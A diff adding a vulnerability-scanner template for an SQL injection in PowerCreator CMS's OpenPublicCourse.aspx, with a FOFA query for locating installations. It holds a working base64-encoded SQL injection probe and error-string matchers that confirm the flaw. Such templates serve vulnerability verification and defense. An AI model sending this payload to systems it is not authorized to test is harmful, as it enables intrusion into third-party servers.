@@ -1,0 +1,25 @@
+## id: VEID-2025-0115
+## name: PowerCreator接口OpenPublicCourse.aspx存在sql注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2025
+## description: PowerCreator接口 OpenPublicCourse.aspx存在sql注入漏洞。攻击者可利用该漏洞获取服务器上的信息。
+## fofa-query: app="PowerCreator-CMS"
+## verification: true
+
+
+GET /OpenPublicCourse.aspx?cid=NSBhbmQgMT1zeXMuZm5fc3FsdmFyYmFzZXRvc3RyKEhhc2hCeXRlcygnTUQ1JywnMTIzNDU2JykpLS0%3D HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: status_code == 500
+#@ matcher: body contains "失败"
+#@ matcher: body contains "nvarchar"
+
+
+
+
+
+# @VEIL-STAMP: 67c2f2da09b4c85b2f74e4712d4965ef9d835035f13c3199b256bf39f4700635
